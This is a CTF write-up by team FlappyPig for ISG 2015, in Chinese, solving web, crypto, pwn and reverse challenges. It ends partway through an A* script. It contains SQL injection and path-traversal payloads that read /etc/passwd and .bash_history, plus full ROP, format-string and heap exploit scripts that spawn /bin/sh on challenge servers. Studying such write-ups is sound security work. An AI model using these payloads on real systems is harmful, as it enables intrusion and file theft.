@@ -1,0 +1,1329 @@
+# ISG2015 FlappyPig Writeup
+
+阅读量 **192588**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2015-10-20 13:49:33
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章来源：360安全播报
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+##  ****
+
+## Misc
+
+### Welcome to ISG 2015 (50)
+
+直接在网页源码中找到,em标签替换为下划线即可。
+
+##
+
+## Web
+
+### collision (50)
+
+那串数字的开头是0e,那么我们只要找到同样0e开头的md5值即可。详见[https://v2ex.com/t/188364](//txfile/)。由于php的特性,这两个进行比较的时候会变成0。
+
+### array (150)
+
+在php版本5.4.0 – 5.4.43, 5.5.0 – 5.5.26, 5.6.0 – 5.6.10,
+7.0.0alpha1中数组下标为0x100000000的时候 会和数组下标为0的时候相等
+
+所以构造array.php?user[4294967296]=admin&user[1]=1445132760
+
+后面的时间戳向后设置10秒左右,一直刷新就可以出flag了.
+
+## webdroid (200)
+
+把apk反编译之后可以看到一段代码:
+
+    
+    
+    new DefaultHttpClient();
+    HttpPost localHttpPost = new HttpPost("http://202.120.7.135:8888/html/api.php");
+    JSONObject localJSONObject = new JSONObject();
+    localJSONObject.put("secret", paramString);
+    localHttpPost.setEntity(new StringEntity(localJSONObject.toString()));
+    String str = EntityUtils.toString(new DefaultHttpClient().execute(localHttpPost).getEntity());
+    return str;
+
+大概意思是将JSON数据{"secret":paramString}POST到那个链接
+
+直接用burp发包修改Content-Type提交数据{"secret":0}
+
+解码失败后是null
+
+服务端估计又是用的弱类型判断 null==0
+
+拿到flag
+
+### Fruit Store (200)
+
+GBK注入 直接扔到sqlmap里就能跑
+
+    
+    
+    sqlmap -u "
+    http://202.120.7.140:8888/try.php?fruit=flag%df*"
+
+跑出来之后数据库是store表是tell_me_who_u_are –dump一下就出flag了
+
+### Image Database (200)
+
+提交../../../../../../../etc/passwd可以读到用户主目录是/home/isg
+
+提交../../../../../../../home/isg/.bash_history可以知道/home/isg/web目录下有main.py
+
+直接读读不了所以读main.pyc
+
+反编译字节码之后在代码里看到flag在secret/flag.txt也是不能直接读
+
+看代码之后发现有get_image get_text secret_protect三个主要函数
+
+get_image会将用户提交的数据base64加密后传给secret_protect
+
+get_text会将用户提交的数据直接传给secret_protect
+
+所以通过get_text可以直接绕过secret_protect的限制
+
+get_text绑定的路由是/gettext_underbuilding
+
+所以POST提交的时候用burp拦截下来把/getimg改成/gettext_underbuilding就可以获取flag了
+
+### shell (250)
+
+能上传文件,文件名是 用户名.随机序列所以考虑注册一个.php结尾的用户
+
+直接注册不了带非数字和非字母的用户名,检测之后发现邮箱的位置有注入所以想到在注册的时候直接额外添加一个.php结尾的用户
+
+根据Web 350 Injection那道题的源码猜测本题的SQL插入语句也是
+
+    
+    
+    $sql = "INSERT INTO users(username, password, email, ip) VALUES ('$username', '$password', '$email', '$ip')";
+
+这种形式
+
+所以构造payload:
+
+    
+    
+    username=asdasd5cacc&password=asdasdaccc&email=sasad@qq.com','127.0.0.1'),('sbsun.php','f5de0b92fcff5f1fa67c503c04008278','6666@qq.com','127.0.0.1') %23
+
+形成
+
+$sql = "INSERT INTO users ( username , password , email , ip) VALUES (
+'asdasd5cacc' ,
+'asdasdaccc','sasad@qq.com','127.0.0.1'),('sbsun.php','f5de0b92fcff5f1fa67c503c04008278','6666@qq.com','127.0.0.1')
+# ','$ip')";
+
+来同时插入两个用户
+
+然后用新注册的用户登录后上传文件并访问即可拿到flag.
+
+### SuperAdmin (250)
+
+估计是注册的时候没有把用户名trim而登录时验证的是用户名trim后是否等于"admin"
+所以注册的时候用户名注册为类似admin%20%0a这种,登录之后会被认为是admin登陆
+
+登陆之后提示"你不是本机用户,不能看到调试信息"
+
+登陆的时候把XFF头改成127.0.0.1就好了
+
+看到一部分源码,源码具体内容没保存,忘了,就记得主要的是调用一个register函数,前几个参数是用户名,密码,IP,最后一个参数是$is_super
+
+考虑可能存在变量覆盖漏洞
+
+所以再注册一次用户并在url加上参数is_super=1然后注册登陆后即可看到flag
+
+### injection (350)
+
+根据index.php.bak审计源码,
+
+发现可能存在二次注入
+
+search的时候用户名是从session中读取的,
+
+session中的用户信息是在登陆或注册的时候存进去的,
+
+fuzz了一下,发现可能存在内容截断,用户名在数据库中设置的长度是64
+
+提交注册数据
+
+username=lingaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacd&password=asd&email=asd%40qq.com
+
+带入到$sql之后可以造成单引号逃逸,使得$title可以直接注入
+
+$sql = "select * from posts where
+username='lingaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacd' and
+title like '$title'";
+
+登陆后可以直接用search=xxx进行手注也可以带着登陆后的cookie扔到sqlmap里跑,然后就能出flag了
+
+## Crypto
+
+### RSA (100)
+
+从使用openssl从pem文件中提取e,n,n为256bit,上rsatools直接破:
+
+然后利用n求得d后直接解密enc文件即可:
+
+    
+    
+    __author__ = 'bibi'
+    n=0xA41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7
+    e=65537
+    p=0xD7DB8F68BCEC6D7684B37201385D298B
+    q=0xC292A272E8339B145D9DF674B9A875D5
+    d=0x330228A0BBE9C119B6B9FEB34B673E6D9AAC3AD81409694B576871521254A2C1
+    r=open("flag.enc","rb")
+    re=r.read()
+    print re.encode("hex")
+    m=0x49b96edbe3961f58d529074bd893d6e036ceaf2b6d214b470fdc0d48723d6a40
+    c=pow(m,d,n)
+    print c
+    print(('0'+hex(c)[2:][:-1]).decode("hex"))  
+  
+### Alice(200)
+
+通过交互得知Alice在和Bob使用共享密钥算法Diffie-Hellman,这个题目本身并没有难点,主要是能够成功和Alice交互密钥即可。首先Alice向Bob提供了素数p和原根g,然后Alice自己产生了自己的私钥,并计算出公钥即key发送给Bob。我们作为Bob的模拟方,首先自己随便取一个私钥,然后根据素数p和原根g计算出公钥,发送给Alice,并通过Alice的公钥和我们的私钥计算出共享密钥K。Alice之后发送过来的密文即可以用K异或解密了。和Alice进行脑洞的对话后获取flag。注意密钥的长度不够,在flag传过来的时候,密钥倍长了一次。
+
+    
+    
+    __author__ = 'bibi'
+     from zio import *
+     import time
+     def convert_int(s):
+         rs=s[::-1]
+         r=0
+         for i in rs:
+             r=(r<<8)|(ord(i))
+         return r
+     def tentostr(k):
+         temp=hex(k)
+         t=str(temp)
+         if t[-1]=='l' or t[-1]=='L':
+             t=t[0:-1]
+         r=t[2:]
+         l=len(r)
+         if l % 2 == 1:
+             r='0'+r
+         return r.decode("hex")
+     def crypt(c,key):
+         miyao=tentostr(key)
+         miyao=miyao+miyao
+         result=""
+         for i in range(len(c)):
+             result=result+chr(ord(c[i])^ord(miyao[i]))
+         return result
+     
+     io=zio(("202.120.7.153",10002))
+     text=io.read_until("Bob: KEY =")
+     p=7434819441271677988772806904156413576519364203006754273683435665142647787269043488641
+     g=3
+     
+     agkey=int(text.split("KEY = ")[1].split("n")[0])
+     bskey=123
+     bgkey=pow(g,bskey,p)
+     io.write(str(bgkey))
+     
+     K=pow(agkey,bskey,p)
+     next=io.read_until("nBob: ")
+     text=next.split("Alice: ")[1].split("n")[0].decode("base64")
+     
+     #print "################"+crypt(text,K)
+     io.write(crypt("Alice",K).encode("base64"))
+     text2=io.read_until("n")
+     time.sleep(1)
+     m2=text2.split("e: ")[1].split("n")[0].decode("base64")
+     print crypt(m2,K)
+     io.interact()  
+  
+---  
+  
+##
+
+## Exploit
+
+### pwnme (100)
+
+逻辑非常简单:
+
+覆盖返回地址后,构造rop即可拿到shell,代码如下:
+
+    
+    
+    __author__ = "pxx"
+    from zio import *
+    import struct
+    target = ("202.120.7.145", 9991)#"./pwnme"
+    def get_io(target):
+             io = zio(target, timeout = 9999)
+             return io
+    def full_buff(cur_data, length, ch_t = 'a'):
+             len_t = length - len(cur_data)
+             return cur_data + ch_t * len_t
+    def pwn(io):
+             io.read_until("the flag:n")
+             io.gdb_hint()
+             data = full_buff("a", 16)
+             print "data len:", len(data)
+             write_plt_addr = l32(0x08048370)
+             read_plt_addr = l32(0x08048330)
+             read_got_addr = 0x0804a00c
+             write_got_addr = 0x0804a01c
+             ebp_str = l32(0x01010101)
+             p_ret = l32(0x08048311)
+             pp_ret = l32(0x0804853e)
+             ppp_ret = l32(0x0804853d)
+             shellcode = write_plt_addr + ppp_ret + l32(0x1) + l32(write_got_addr) + l32(0x4)
+             shellcode += read_plt_addr + ppp_ret + l32(0x0) + l32(write_got_addr) + l32(0x4)
+             shellcode += read_plt_addr + ppp_ret + l32(0x0) + l32(read_got_addr) + l32(0x9)
+             shellcode += write_plt_addr + p_ret + l32(read_got_addr)
+             payload = data + ebp_str + shellcode
+             io.write(payload + 'n')
+             data = io.read(0x4)
+             print len(data)
+             write_real_addr = l32(data)
+             print hex(write_real_addr)
+             libc_addr = write_real_addr - 0x000dac50
+             system_real_addr = libc_addr + 0x00040190
+             binstr_real_addr = libc_addr + 0x160a24
+             io.write(l32(system_real_addr))
+             io.write("/bin/sh;n")
+             io.interact()
+    io = get_io(target)
+    pwn(io)
+
+flag如下:
+
+### echo (200)
+
+逻辑非常简单:
+
+属于格式化字符串漏洞,泄露地址后,用system将fgets的got表覆盖就可以拿到shell,开启了pie,泄露时还需要计算好got表的地址:
+
+由于没有提供libc,直接与前面给出的地址作比较,猜想就是同一个libc,代码如下:
+
+    
+    
+    __author__ = "pxx"
+    from zio import *
+    import struct
+    target = ("202.120.7.152", 9995)
+    #target = "./echo"
+    def get_io(target):
+             io = zio(target, timeout = 9999)
+             return io
+    def full_buff(cur_data, length, ch_t = 'a'):
+             len_t = length - len(cur_data)
+             return cur_data + ch_t * len_t
+    def generate_format_string(index, length):
+             data = ""
+             while True:
+                       buff = "%%%d$p."%(index)
+                       if len(data) + len(buff) > length:
+                                return data, index
+                       data += buff
+                       index += 1
+    def get_buff(io):
+             index = 1
+             times = 10
+             total_buff = ""
+             while times > 0:
+                       io.read_until("Your Message: ")
+                       data, index = generate_format_string(index, 127 - 20)
+                       times -= 1
+                       io.write('a' * 20 + data + "n")
+                       data = io.read_until("n").strip()
+                       total_buff += data
+             io.gdb_hint()
+             io.interact()
+    def get_addr(io):
+             index = 1
+             times = 10
+             total_buff = ""
+             while times > 0:
+                       io.read_until("Your Message: ")
+                       data, index = generate_format_string(index, 127)
+                       times -= 1
+                       io.write(data + "n")
+                       data = io.read_until("n").strip()
+                       total_buff += data
+             io.gdb_hint()
+             addr = int(raw_input("addr to compare:"), 16)
+             for index, item in enumerate(total_buff.split('.')[:-1]):
+                       if item == "(nil)":
+                                continue
+                       print index + 1, "->", item, ":", hex(int(item, 16) - addr)
+             io.interact()
+    def pwn(io):
+             io.read_until("Your Message: ")
+             data = "%43$p.%51$p"
+             io.write(data + "n")
+             data = io.read_until("n").strip()
+             data = data.split(".")
+             libc_start_main = int(data[0], 16)
+             fgets_got_addr = int(data[1], 16) - (0xf770c030 - 0xf770c018)
+             #local
+             #offset___libc_start_main_ret = 0x19a83
+             #offset_system = 0x0003e800
+             #offset_puts = 0x000656a0
+             #offset_memset = 0x0007c680
+             #remote
+             offset___libc_start_main_ret = 0x19a83
+             offset_system = 0x00040190
+             libc_addr = libc_start_main - offset___libc_start_main_ret
+             system_real_addr = libc_addr + offset_system
+             text_addr = fgets_got_addr - 0x00002018
+             break_point = text_addr + 0x0000081D
+             print "fgets_got_addr:", hex(fgets_got_addr)
+             print "break_point:", hex(break_point)
+             print "system_real_addr:", hex(system_real_addr)
+             io.gdb_hint()
+             io.read_until("Your Message: ")
+             data = "hello"
+             io.write(data + "n")
+             addr = l32(fgets_got_addr) + l32(fgets_got_addr + 1) + l32(fgets_got_addr + 2) + l32(fgets_got_addr + 3)
+             now_index = 9
+             system_real_str = l32(system_real_addr)
+             total_buff = "/bin/sh;" + addr
+             now_pos = len(total_buff)
+             for i in range(4):
+                       now_value = (system_real_addr >> (i*8)) & 0xff
+                       print "now_value:", hex(now_value)
+                       pad_count = 0
+                       if now_value > now_pos:
+                                pad_count = now_value - now_pos
+                       else:
+                                pad_count = 0x100 - (now_pos&0xff) + now_value
+                       now_pos += pad_count
+                       print "now_pos:", hex(now_pos)
+                       print "pad_count:", hex(pad_count)
+                       data = "%%%dc%%%d$hhn"%(pad_count, now_index)
+                       now_index += 1
+                       total_buff += data
+             print total_buff
+             io.write(total_buff + "n")
+             io.interact()
+    io = get_io(target)
+    pwn(io)
+
+flag如下:
+
+### dict (400)
+
+这个题目漏洞发现的比较早,但是构造利用的时候花的时间比较长。
+
+漏洞的位置在条件新单词的时候,使用realloc函数申请内存,但是没有检查是否申请成功,如下:
+
+假设申请内存特别大,此时realloc返回0,此时count为正数,也会进入读数据的循环中,在读数据之前,计算了存储的起始地址:
+
+v1 = (char *)(0x20 * (count_before + j) + dict_info_804A0C4[index].buff);
+
+若此时buff为0,那么v1的值就是(0x20 * (count_before + j),那么此时就只与前面的数量相关了,
+发生任意写(地址为32的整数倍),为了实现任意读,其实可以在这里进行灵活控制来设置,将v1指向0x804a0c0(也就是全局存储结构体count,ptr变量的位置),这个刚好也为32的整数倍,将其buff的值进行覆盖,改成got表,就可以泄露地址,而且可以在增加的时候,进行地址覆盖,覆盖时候可以多覆盖几个count和buff这样就可以实现不同功能的地址引用。有的用于泄露,有的用于改写,因为地址没法重复利用。
+
+利用方法:
+
+1.申请6个字典
+
+2.往字典1中添加4203782个单词,
+
+#0x0804a0c0/0x20
+
+count_to_node0 = 4203782
+
+3.在申请0x0f101010个单词,发生realloc失败,填写全局变量0x804a0c0中的数据
+
+4.分别泄露atoi,puts,memset(本来常理泄露一个就行,用libcdatabase就可以找到,但是有的不同libc中system地址根据偏移计算是对的,但是其他小函数计算就老是不对,在这里全泄露出来)
+
+5.计算system地址,从 puts的got表开始覆盖,直至覆盖到atoi,puts和memset函数需要正确填写,因为后面还有用到:
+
+6.在输入选择的时候,直接传“/bin/sh;”就可以拿到shell了。
+
+代码如下:
+
+    
+    
+    __author__ = "pxx"
+    from zio import *
+    import struct
+    target = "./dict"
+    target = ("202.120.7.146", 9992)#
+    def get_io(target):
+             io = zio(target, timeout = 9999)
+             return io
+    def full_buff(cur_data, length, ch_t = 'a'):
+             len_t = length - len(cur_data)
+             return cur_data + ch_t * len_t
+    def create_dict(io, count, value_list):
+             io.read_until("$ ")
+             io.write("1n")
+             io.read_until("dict: ")
+             io.write(str(count) + "n")
+             for index, item in enumerate(value_list):
+                       io.read_until("%d:"%index)
+                       io.write(item)
+    def add_new_words(io, index, count, value_list, yes_sign = True):
+             io.read_until("$ ")
+             io.write("2n")
+             io.read_until("dict: ")
+             io.write(str(index) + "n")
+             io.read_until("add? ")
+             io.write(str(count) + "n")
+             for index, item in enumerate(value_list):
+                       io.read_until("Input new word %d: "%index)
+                       print "send one", len(item)
+                       length = len(item)
+                       if length > 10000 and yes_sign:
+                                index = 0
+                                sign = False
+                                add_count = 50000
+                                while index < length:
+                                         print index
+                                         io.write(item[index:index+add_count])
+                                         index += add_count
+                                         if index > length:
+                                                   index = length
+                                                   sign = True
+                                         else:
+                                                   io.read_until("Input new word %d: "%(index/2 - 1))
+                                io.read_until("Input new word %d: "%(index/2 - 1))       
+                       else:
+                                io.write(item)
+    def view_words(io, index):
+             io.read_until("$ ")
+             io.write("3n")
+             io.read_until("dict: ")
+             io.write(str(index) + "n")
+    def pwn(io):     
+             puts_got_addr = 0x0804a020
+             atoi_got_addr = 0x0804a038
+             memset_got_addr = 0x0804a034
+             len_to_write = atoi_got_addr - puts_got_addr
+             value_list = [];
+             value_list.append("n")
+             #0x0804a020/0x20
+             count_to_puts = 4203777
+             #0x0804a0c0/0x20
+             count_to_node0 = 4203782
+             #0x0804a0e0/0x20
+             count_to_node4 = 4203783
+             #count_to_node0 = 20000
+             create_dict(io, 1, value_list)#0
+             create_dict(io, 1, value_list)#1
+             create_dict(io, 1, value_list)#2
+             create_dict(io, 1, value_list)#3
+             create_dict(io, 1, value_list)#4
+             create_dict(io, 1, value_list)#5
+             value_list = []
+             for i in xrange(count_to_node0):
+                       value_list.append("8n")
+             add_new_words(io, 0, count_to_node0, ["".join(value_list)])
+             value_list = []
+                                  #node0->count + ptr + node1->count + ptr
+             payload = ""
+             payload += l32(0x1) + l32(0) #0  can't move
+             payload += l32(0x1) + l32(atoi_got_addr) #1 show
+             payload += l32(count_to_puts) + l32(0x0) #2 add
+             value_list.append(payload +"n")
+             payload = ""
+             payload += l32(0x1) + l32(puts_got_addr) #4 show
+             payload += l32(0x1) + l32(memset_got_addr) #5 show
+             value_list.append(payload +"n")
+             value_list.append("n")
+             add_new_words(io, 0, 0x0f101010, value_list, False)
+             #print value_list
+             view_words(io, 1)
+             io.read_until("1: ")
+             data = io.read(4)
+             print [c for c in data]
+             atoi_real_addr = l32(data)
+             print "atoi_real_addr:", hex(atoi_real_addr)
+             view_words(io, 4)
+             io.read_until("1: ")
+             data = io.read(4)
+             print [c for c in data]
+             puts_real_addr = l32(data)
+             print "puts_real_addr:", hex(puts_real_addr)
+             view_words(io, 5)
+             io.read_until("1: ")
+             data = io.read(4)
+             print [c for c in data]
+             memset_real_addr = l32(data)
+             print "memset_real_addr:", hex(memset_real_addr)
+             #local
+             offset_atoi = 0x0002fbb0
+             offset_system = 0x0003e800
+             #offset_puts = 0x000656a0
+             #offset_memset = 0x0007c680
+             #remote
+             offset_atoi = 0x00031860
+             offset_system = 0x00040190
+             is_know = True
+             if is_know == False:
+                       offset_atoi = int(raw_input("atoi_off_set:"), 16)
+                       offset_system = int(raw_input("system_off_set:"), 16)
+                       #offset_puts = int(raw_input("puts_offset:"), 16)
+                       #offset_memset = int(raw_input("memset_offset:"), 16)
+             libc_real_addr = atoi_real_addr - offset_atoi
+             system_real_addr = libc_real_addr + offset_system
+             #puts_real_addr = libc_real_addr + offset_puts
+             #memset_real_addr = libc_real_addr + offset_memset
+             value_list = []
+             payload = ""
+             payload += l32(puts_real_addr) + 'a' * (len_to_write - 8) + l32(memset_real_addr) + l32(system_real_addr) #4
+             value_list.append(payload +"n")
+             value_list.append("n")
+             print "begin to send useful data"
+             add_new_words(io, 2, 0x0f101010, value_list, False)
+             print "end to send useful data end"
+             io.read_until("$ ")
+             io.write("/bin/sh;n")
+             io.interact()
+    io = get_io(target)
+    pwn(io)
+
+flag如下:
+
+## Reverse
+
+### flagfinder (100)
+
+该程序的逻辑就是在磁盘上搜索文件,找到一个文件的md5值为target值时,会计算其相应的sha1256的值,据此生成flag,代码如下:
+
+    
+    
+    private static byte[] target = new byte[] { 0x6c, 0xcb, 0x61, 0x45, 90, 0xd8, 0x92, 0x19, 0x90, 0x2b, 0x3a, 0xf6, 10, 0x9a, 0x2d, 0x1c };
+    
+    
+    Console.WriteLine("Analyzing " + file.FullName + " ...");
+    MD5CryptoServiceProvider provider = new MD5CryptoServiceProvider();
+    if (provider.ComputeHash(file.OpenRead()).SequenceEqual<byte>(target))
+    {
+        SHA256CryptoServiceProvider provider2 = new SHA256CryptoServiceProvider();
+    Console.WriteLine("We've found the flag on your hard drive:");
+    Console.WriteLine("ISG{" + BitConverter.ToString(provider2.ComputeHash(file.OpenRead())).ToLower() + "}");
+        Environment.Exit(0);
+    }
+
+直接找文件肯定不行,解决方法是,计算md5后,google一下,找到网站上面有,如下:
+
+将其sha256,带入,计算的结果:
+
+### tlc (150)
+
+分析程序,首先输入12字节,然后rot13,然后base64解码,然后做了一个判断(高n位能被n整除),最后用输入作为密钥解密一段数据,得到flag。
+
+但是满足高n位能被n整除的数很多,于是爆破。
+
+根据base64后数据位12字节,原始的数可能的位数为7,8,9。(先试的8和7都不行,最后才试的9)
+
+首先生成满足高n位能被n整除的数据:
+
+    
+    
+    #include <iostream>
+    using namespace std;
+    int main()
+    {
+        int i,j,temp;
+        for (i=0;i<=1000000000;i++)
+        {
+            temp=i;
+            for (j=9;j>1;j--)
+            {
+                if (temp % j == 0)
+                {
+                    temp=temp/10;
+                    continue;
+                }
+                else
+                {
+                    break;
+                }
+            }
+            if (j==1)
+            {
+                cout<<i<<endl;
+             } 
+        }
+     }
+
+运行tlc得到程序输出
+
+    
+    
+    import base64
+    from zio import *
+    target = './tlc'
+    def rot13(s):
+        d = {chr(i+c): chr((i+13)%26+c) for i in range(26) for c in (65,97)}
+        return ''.join([d.get(c,c) for c in s])
+    def exp(target, s):
+        #io = zio(target, timeout=10000, print_read=COLORED(REPR, 'red'), print_write=COLORED(REPR, 'green'))
+        io = zio(target, timeout=10000, print_read=COLORED(NONE, 'red'), print_write=COLORED(NONE, 'green'))
+        io.read_until(":")
+        io.writeline(s)
+        io.read_until(':')
+        print io.readline().strip('n')
+        io.close()
+    f  = open('./len9.txt', 'r')
+    for line in f:
+        line = line.strip().rjust(9, '0')
+        if line != '':
+            print line
+            exp(target,rot13(base64.encodestring(line)))
+
+在输出中搜索ISG发现,数为381654729时,输出flag。
+
+### 是男人就下一百层 (300)
+
+分析程序,只有一个start函数,无数行汇编代码。功能很简单,让输入数据,然后对数据进行8字节逐个比较,最后如果都满足,用jmp rsp执行刚才输入的数据。
+
+    
+    
+    .text:0000000001092509                 mov     al, [rsp+3B98E4h]
+    .text:0000000001092510                 xor     al, 0FFh
+    .text:0000000001092512                 jnz     short loc_1092516
+    .text:0000000001092514                 jmp     rsp
+
+本来想用ida提取汇编代码,不过ida分析实在太慢了,于是用了一个反汇编库,生成汇编代码。
+
+    
+    
+    import capstone
+    target = './onion'
+    f = open(target, 'rb')
+    CODE = f.read()[0x157:0x1092509-0x400000]
+    #CODE = f.read()[0x157:0x157+0x100]
+    f.close()
+    md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
+    for i in md.disasm(CODE, 0x400157):
+        #print i.mnemonic
+        #print i.op_str
+    print "0x%x:t%st%s" %(i.address, i.mnemonic, i.op_str)
+
+提取出汇编中mov rbx,imm中立即数的值,组合作为输入。
+
+    
+    
+    f = open('a.txt', 'rb')
+    payload = ''
+    for line in f:
+        if 'movabs' in line:
+            value = line.split(',')[1].strip()
+            if value.startswith('-'):
+                d = int(value, 16) + 0xffffffffffffffff + 1
+            else:
+                d = int(value, 16)
+            payload += l64(d)
+    payload += 'xff'*5
+    f.close()
+    f = open('b.txt', 'wb')
+    f.write(payload)
+    f.close()
+
+这样求出来的只是过了第一层,后面层的方法类似。最后解到9层,看到一段赋值的汇编码,提取出来就是flag。
+
+    
+    
+    d = '''
+    0x17b:  mov byte ptr [rsp], 0x54
+    0x17f:  mov byte ptr [rsp + 1], 0x68
+    0x184:  mov byte ptr [rsp + 2], 0x65
+    0x189:  mov byte ptr [rsp + 3], 0x20
+    0x18e:  mov byte ptr [rsp + 4], 0x66
+    0x193:  mov byte ptr [rsp + 5], 0x6c
+    0x198:  mov byte ptr [rsp + 6], 0x61
+    0x19d:  mov byte ptr [rsp + 7], 0x67
+    0x1a2:  mov byte ptr [rsp + 8], 0x20
+    0x1a7:  mov byte ptr [rsp + 9], 0x69
+    0x1ac:  mov byte ptr [rsp + 0xa], 0x73
+    0x1b1:  mov byte ptr [rsp + 0xb], 0x20
+    0x1b6:  mov byte ptr [rsp + 0xc], 0x49
+    0x1bb:  mov byte ptr [rsp + 0xd], 0x53
+    0x1c0:  mov byte ptr [rsp + 0xe], 0x47
+    0x1c5:  mov byte ptr [rsp + 0xf], 0x7b
+    0x1ca:  mov byte ptr [rsp + 0x10], 0x47
+    0x1cf:  mov byte ptr [rsp + 0x11], 0x31
+    0x1d4:  mov byte ptr [rsp + 0x12], 0x76
+    0x1d9:  mov byte ptr [rsp + 0x13], 0x33
+    0x1de:  mov byte ptr [rsp + 0x14], 0x5f
+    0x1e3:  mov byte ptr [rsp + 0x15], 0x79
+    0x1e8:  mov byte ptr [rsp + 0x16], 0x30
+    0x1ed:  mov byte ptr [rsp + 0x17], 0x55
+    0x1f2:  mov byte ptr [rsp + 0x18], 0x5f
+    0x1f7:  mov byte ptr [rsp + 0x19], 0x4d
+    0x1fc:  mov byte ptr [rsp + 0x1a], 0x59
+    0x201:  mov byte ptr [rsp + 0x1b], 0x5f
+    0x206:  mov byte ptr [rsp + 0x1c], 0x4f
+    0x20b:  mov byte ptr [rsp + 0x1d], 0x6e
+    0x210:  mov byte ptr [rsp + 0x1e], 0x31
+    0x215:  mov byte ptr [rsp + 0x1f], 0x30
+    0x21a:  mov byte ptr [rsp + 0x20], 0x6e
+    0x21f:  mov byte ptr [rsp + 0x21], 0x5f
+    0x224:  mov byte ptr [rsp + 0x22], 0x68
+    0x229:  mov byte ptr [rsp + 0x23], 0x33
+    0x22e:  mov byte ptr [rsp + 0x24], 0x34
+    0x233:  mov byte ptr [rsp + 0x25], 0x72
+    0x238:  mov byte ptr [rsp + 0x26], 0x37
+    0x23d:  mov byte ptr [rsp + 0x27], 0x7d
+    0x242:  mov byte ptr [rsp + 0x28], 0xa
+    0x247:  mov byte ptr [rsp + 0x29], 0
+    '''
+    aaa = ''
+    for a in d.split('n'):
+        if ',' in a:
+            aaa += chr(int(a.split(',')[1],16))
+    print aaa
+
+输出:
+
+### Poppy (350)
+
+第一次在ctf中遇到mac程序,这是在欺负穷人。所以最开始基本是一直在静态看,只有最后才用土豪队友的mac本运行得到flag。
+
+首先看程序,感觉就是标准的crackme,然后陷入了出题人的陷阱中,去分析前面的变换算法。
+
+变换算法是经过混淆的,有同或、异或啥的,最后化解如下:
+
+    
+    
+    v12 = 0x476E614B
+    v11 = 0x306F7261
+    v10 = 0x47475349 << 6
+    for i in range(64):
+        v11 = v11 - ((a+(v12>>5)) ^ (v12+v10)^(b+16*v12))
+        v12 = v12 - ((c+(v11>>5) )^ ((v10+v11)^(d+16*v11)))
+        v10 -= 0x47475349
+    need (v12 == 0x8906C3AD)
+    need (v11 == 0x0B442F5FC)
+
+TEA加密算法,知道明文、密文,求key。不会。
+
+后来 发现后面还有点代码,反正没事,就看看了。
+
+在sub_100001530中,首先用输入的前6个字节与程序中的数据异或生成了一个url。url的开头肯定是http://或者[https://,基于此,算出了输入的前6](https://%EF%BC%8C%E5%9F%BA%E4%BA%8E%E6%AD%A4%EF%BC%8C%E7%AE%97%E5%87%BA%E4%BA%86%E8%BE%93%E5%85%A5%E7%9A%84%E5%89%8D6)个字节。求得前6个字节为T0mato,解出来的url为[https://ctftime.org/event/](https://ctftime.org/event/)。
+
+后面程序进入一个18次的循环,每次去访问ctftime的一个页面,然后调用了一个控制流混淆过的函数。
+
+混淆函数没完全看明白,大概猜测是获取某行的第某个字节。
+
+想到题目中说flag为ISG{未输出的内容},v2为char型,循环了18次,比较可能跟flag有关。
+
+后面就用mac本进行调试了,直接在sub_100001330函数返回处下断点,查看每次的eax值,组合起来就是flag。(因网络问题,有时返回的可能为0,需要重跑)。
+
+Flag为ISG{whatAb0uTacupoFte4}
+
+Ps:论有mac本的重要性。
+
+### RPG (400)
+
+分析发现是用rpg maker xp制作出来的游戏,于是下载了该软件。在game目录下放一个Game.rxproj,文件中内容为“RPGXP
+1.03”,然后可以打开工程了。
+
+Rpg maker
+xp中支持脚本,ruby语法的,然后花了些时间学习怎么用脚本。最后写了个程序提取出地图信息,主要就是用game_player.passable?(x,y,
+d)判断是否通行。
+
+Rpg中运行脚本很容易卡死,这里需要分多次提取地图信息。
+
+    
+    
+    file1 = File.new("path.info", "ab+")
+        
+        i = 1
+        str = String.new
+        while i < 498 do
+          str = ""
+          j = 1
+          while j < 498 do
+            a = $game_player.passable?(j,i,2)?1:0
+            a += $game_player.passable?(j,i,4)?2:0
+            a += $game_player.passable?(j,i,6)?4:0
+            a +=  $game_player.passable?(j,i,8)?8:0
+            str << a
+            j += 1
+          end
+          file1.write(str)
+          i += 1
+    end
+
+得到地图信息后,用A*算法求路径。
+
+    
+    
+    # -*- coding: utf-8 -*-    # copy from http://blog.chinaunix.net/uid-20749137-id-718757.html
+    # modify by pxx
+    import math
+    #地图
+    tm = [
+    '############################################################',
+    '#..........................................................#',
+    '#.............................#............................#',
+    '#.............................#............................#',
+    '#.............................#............................#',
+    '#.......S.....................#............................#',
+    '#.............................#............................#',
+    '#.............................#............................#',
+    '#.............................#............................#',
+    '#.............................#............................#',
+    '#.............................#............................#',
+    '#.............................#............................#',
+    '#.............................#............................#',
+    '#######.#######################################............#',
+    '#....#........#............................................#',
+    '#....#........#............................................#',
+    '#....##########............................................#',
+    '#..........................................................#',
+    '#..........................................................#',
+    '#..........................................................#',
+    '#..........................................................#',
+    '#..........................................................#',
+    '#...............................##############.............#',
+    '#...............................#........E...#.............#',
+    '#...............................#............#.............#',
+    '#...............................#............#.............#',
+    '#...............................#............#.............#',
+    '#...............................###########..#.............#',
+    '#..........................................................#',
+    '#..........................................................#',
+    '############################################################']
+    tm = [
+    '############################################################',
+    '#..........................................................#',
+    '#.............................#............................#',
+    '#.......S.....................#............................#',
+    '#...............................##############.............#',
+    '#...............................#........E...#.............#',
+    '#...............................#............#.............#',
+    '#...............................###########..#.............#',
+    '#..........................................................#',
+    '############################################################']
+    #因为python里string不能直接改变某一元素,所以用test_map来存储搜索时的地图
+    test_map = []
+    #########################################################
+    class Node_Elem:
+        """
+        开放列表和关闭列表的元素类型,parent用来在成功的时候回溯路径
+        """
+        def __init__(self, parent, x, y, dist):
+            self.parent = parent
+            self.x = x
+            self.y = y
+            self.dist = dist
+            
+    class A_Star:
+        """
+        A星算法实现类
+        """
+        #注意w,h两个参数,如果你修改了地图,需要传入一个正确值或者修改这里的默认参数
+        def __init__(self, s_x, s_y, e_x, e_y, w=60, h=30):
+            self.s_x = s_x
+            self.s_y = s_y
+            self.e_x = e_x
+            self.e_y = e_y
+            
